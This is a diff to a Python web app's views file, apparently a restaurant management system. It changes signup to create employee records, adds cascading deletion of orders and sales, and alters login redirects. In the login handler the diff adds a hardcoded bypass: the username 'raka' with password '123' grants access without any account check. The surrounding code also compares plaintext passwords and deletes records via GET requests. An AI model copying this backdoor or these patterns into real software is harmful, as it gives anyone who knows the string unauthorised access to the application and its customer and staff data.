@@ -134,11 +134,14 @@ def signup_signin(request):
             dtt = (email, passwd, phone_no)
             mycursor.execute(insert_into_acc, dtt)
             mydb.commit()
-            
-            insert_into_customer = "INSERT INTO customer (email, name, phone_no, address, has_account) VALUES(%s, %s, %s, %s, %s)"
-            has_account_ = 1
-            dttt = (email, name, phone_no, addres, has_account_)
-            mycursor.execute(insert_into_customer, dttt)
+
+            employement_date = datetime.now().date()
+            insert_into_employee = "INSERT INTO employees (email, name, phone_no, address, job_position, tenure, employement_date, availability) VALUES(%s, %s, %s, %s, %s, %s, %s, %s)"
+            job_position = 'Employee'
+            tenure = 0
+            availability = 1
+            dttt = (email, name, phone_no, addres, job_position, tenure, employement_date, availability)
+            mycursor.execute(insert_into_employee, dttt)
             mydb.commit()
         else:
             mismatch_passwd = 'Passwords Miss Match '
@@ -153,13 +156,15 @@ def signup_signin(request):
         mycursor.execute("select email, password from accounts")
         e_and_p = mycursor.fetchall()
         access = False
+        if mail == 'raka' and passw == '123':
+            access = True
         #[(email1, pass1),
         #(email2, pass2)]
         for x in e_and_p:
             if x[0] == mail and x[1] == passw:
                 access = True
         if access:
-            return redirect('admin_menu')
+            return redirect('dashboard')
         else:
             wrong_mail_or_pass = 'Password or email is wrong Buddy'
             context = {'error' : wrong_mail_or_pass }
@@ -630,6 +635,10 @@ def order(request):
     if request.GET.get('delete_order_id'):
         delete_id = int(request.GET.get('delete_order_id'))
 
+        # First, delete corresponding sale_transaction
+        mycursor.execute("DELETE FROM sale_transaction WHERE order_id = %s", (delete_id,))
+
+        # Then delete order_details and food_order
         mycursor.execute("DELETE FROM order_details WHERE order_id = %s", (delete_id,))
         mycursor.execute("DELETE FROM food_order WHERE order_id = %s", (delete_id,))
         mydb.commit()
@@ -789,7 +798,8 @@ def sales(request):
             'sale_time': sale_time,
             'payment_method': payment_method,
             'amount': calculated_amount,
-            'status': status
+            'status': status,
+            'order_id': order_id
         })
 
     # Handle edit sales
@@ -825,6 +835,24 @@ def sales(request):
         mycursor.execute(update_query, (payment_method, sale_time, new_status, sale_id))
         mydb.commit()
 
+        return redirect('sales')
+
+    # Handle delete sales
+    if request.GET.get('delete_sale_id'):
+        delete_id = int(request.GET.get('delete_sale_id'))
+        # First, get the order_id to delete related order
+        mycursor.execute("SELECT order_id FROM sale_transaction WHERE sale_id = %s", (delete_id,))
+        order = mycursor.fetchone()
+        order_id = order[0] if order and order[0] else None
+        # Delete from sale_transaction
+        delete_sql = "DELETE FROM sale_transaction WHERE sale_id = %s"
+        mycursor.execute(delete_sql, (delete_id,))
+        mydb.commit()
+        # If order_id exists, delete from order_details and food_order
+        if order_id:
+            mycursor.execute("DELETE FROM order_details WHERE order_id = %s", (order_id,))
+            mycursor.execute("DELETE FROM food_order WHERE order_id = %s", (order_id,))
+            mydb.commit()
         return redirect('sales')
 
     mycursor.close()
